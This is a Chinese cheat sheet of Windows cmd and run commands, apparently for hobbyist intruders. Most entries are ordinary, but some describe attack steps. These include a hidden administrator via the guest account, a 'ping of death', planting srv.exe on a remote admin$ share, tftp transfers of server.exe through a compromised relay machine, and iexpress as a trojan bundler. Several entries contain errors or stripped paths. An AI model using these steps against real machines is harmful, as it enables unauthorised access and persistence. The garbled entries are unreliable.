dir 列出文件类似linux ls
notepad类似linux vi
start 1.txt # 打开文件
del 1.txt # 删除文件
rd 删除文件夹  相当于 rm -rf 
ren 源文件名 新文件名 #  修改文件名 相当于 mv 
copy 1.txt c:\.\    复制文件到c盘
copy 1.txt 创建文件  ctrl +z 保存退出
cat 相当于 windows type # 查看文件
mkdir 或md 类似 linux mkdir
move 1.txt c: \   # 移动文件到c盘 
coler 字体颜色
net view 查看局域网子域名
meg administrator "你好" # 发送信息
net user name passwd /add 创建用户
net user # 查看用户
net localgroup administrator name /add # 有空格的用“”包括
net localgroup “Remote Desktop Users”/add #远程桌面组
net user guest /active:yes #启用来宾账户
net user guest 123123 # 创建guest 用户密码
net localgroup administrator guest /add
netstat -a 查看开启哪些端口
netstat -n 查看端口网络连接情况
netstat -v 查看正在进行的工作
at id号 开启自己注册的莫个任务计划
at /delete 停止所有计划
at id /delete 删除id的计划
at 查看所有计划
attrib 文件名 （目录名） 查看文件目录的属性
attrib 文件名 -A-R-S-H 或+A+R+S+H去掉或添加文件的存档，只读。系统，隐藏属性 
winver---------检查windows版本 
wmimgmt.msc----打开windows管理体系结构(wmi) 
wupdmgr--------windows更新程序 
wscript--------windows脚本宿主设置 
write----------写字板 
winmsd---------系统信息 
wiaacmgr-------扫描仪和照相机向导 
winchat--------xp自带局域网聊天 
mem.exe--------显示内存使用情况 
msconfig.exe---系统配置实用程序 
mplayer2-------简易widnows media player 
mspaint--------画图板 
QQ：83455367  防止盗版.
mstsc----------远程桌面连接 
mplayer2-------媒体播放机 
magnify--------放大镜实用程序 
mmc------------打开控制台 
mobsync--------同步命令 
dxdiag---------检查directx信息 
drwtsn32------ 系统医生 
devmgmt.msc--- 设备管理器 
dfrg.msc-------磁盘碎片整理程序 
diskmgmt.msc---磁盘管理实用程序 
dcomcnfg-------打开系统组件服务 
ddeshare-------打开dde共享设置 
dvdplay--------dvd播放器 
net stop messenger-----停止信使服务 
net start messenger----开始信使服务 
notepad--------打开记事本 
nslookup-------网络管理的工具向导 
ntbackup-------系统备份和还原 
narrator-------屏幕“讲述人” 
ntmsmgr.msc----移动存储管理器 
ntmsoprq.msc---移动存储管理员操作请求 
netstat -an----(tc)命令检查接口 
syncapp--------创建一个公文包 
sysedit--------系统配置编辑器 
sigverif-------文件签名验证程序 
sndrec32-------录音机 
shrpubw--------创建共享文件夹 
secpol.msc-----本地安全策略 
syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 
services.msc---本地服务设置 
sndvol32-------音量控制程序 
sfc.exe--------系统文件检查器 
sfc /scannow---windows文件保护 
tsshutdn-------60秒倒计时关机命令 
tourstart------xp简介（安装完成后出现的漫游xp程序） 
taskmgr--------任务管理器 
eventvwr-------事件查看器 
eudcedit-------造字程序 
explorer-------打开资源管理器 
packager-------对象包装程序 
perfmon.msc----计算机性能监测程序 
progman--------程序管理器 
regedit.exe----注册表 
rsop.msc-------组策略结果集 
regedt32-------注册表编辑器 
rononce -p ----15秒关机 
regsvr32 /u *.dll----停止dll文件运行 
regsvr32 /u zipfldr.dll------取消zip支持 
cmd.exe--------cmd命令提示符 
chkdsk.exe-----chkdsk磁盘检查 
certmgr.msc----证书管理实用程序 
calc-----------启动计算器 
charmap--------启动字符映射表 
cliconfg-------sql server 客户端网络实用程序 
clipbrd--------剪贴板查看器 
conf-----------启动netmeeting 
compmgmt.msc---计算机管理 
cleanmgr-------垃圾整理 
ciadv.msc------索引服务程序 
osk------------打开屏幕键盘 
odbcad32-------odbc数据源管理器 
oobe/msoobe /a----检查xp是否激活 
lusrmgr.msc----本机用户和组 
logoff---------注销命令 
iexpress-------木马捆绑工具，系统自带 :)呵呵
nslookup-------ip地址侦测器

1、ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)　　2、ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息　　
3、tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)　　
4、kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)　　
5、del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）　　
6、move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖　　
7、fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令　　at id号 开启已注册的某个计划任务　　
8、at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止　　
9、at id号 /delete 停止某个已注册的计划任务　　at 查看所有的计划任务　　
10、at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机　　
11、finger username @host 查看最近有哪些用户登陆　　
12、telnet ip 端口 远和登陆服务器,默认端口为23　　
13、open ip 连接到IP（属telnet登陆后的命令）　　
14、telnet 在本机上直接键入telnet 将进入本机的telnet　　
15、copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件　　
16、copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下　　
17、copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件　　
18、copy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：　　
19、xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件　　用参数/e才可连目录下的子目录一起复制到目标地址下。　　
20、tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送　　
21、tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机　　
22、ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface　　
23、arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息　　
24、start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令　　
25、mem 查看cpu使用情况　　
26、attrib 文件名(目录名) 查看某文件（目录）的属性　　
27、attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性　　
28、dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间　　
date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间　　set 指定环境变量名称=要指派给变量的字符 设置环境变量　　
29、set 显示当前所有的环境变量　　
30、set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量　　
31、pause 暂停批处理程序，并显示出：请按任意键继续....　　
32、if 在批处理程序中执行条件处理（更多说明见if命令及变量）　　
33、goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）　　
34、call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）　　
35、for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）　　
36、echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置　　
37、echo 信息 在屏幕上显示出信息　　echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中　　
38、findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello　　
39、find 文件名 查找某文件　　title 标题名字 更改CMD窗口标题名字　　
40、color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白　　
41、prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )　　
42、ver 在DOS窗口下显示版本信息　　
43、winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）　　
44、format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS　　
45、md　目录名 创建目录　　
46、replace 源文件　要替换文件的目录 替换文件　　
47、ren 原文件名　新文件名 重命名文件名　　
48、tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称　　
49、type 文件名 显示文本文件的内容　　
50、more 文件名 逐屏显示输出文件　　
51、doskey 要锁定的命令=字符　　
52、doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用53、doskey dir=dir)；解锁：doskey dir=　　
54、taskmgr 调出任务管理器　　
55、chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误　　
56、tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口　　
57、exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe　　
58、path 路径可执行文件的文件名 为可执行文件设置一个路径。　　
59、cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?　　
60、regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；　　
61、regedit /e 注册表文件名 导出注册表　　
62、cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。cacls 文件名 查看文件的访问用户权限列表　　
63、REM 文本内容 在批处理文件中添加注解　　
64、netsh 查看或更改本地网络配置情况
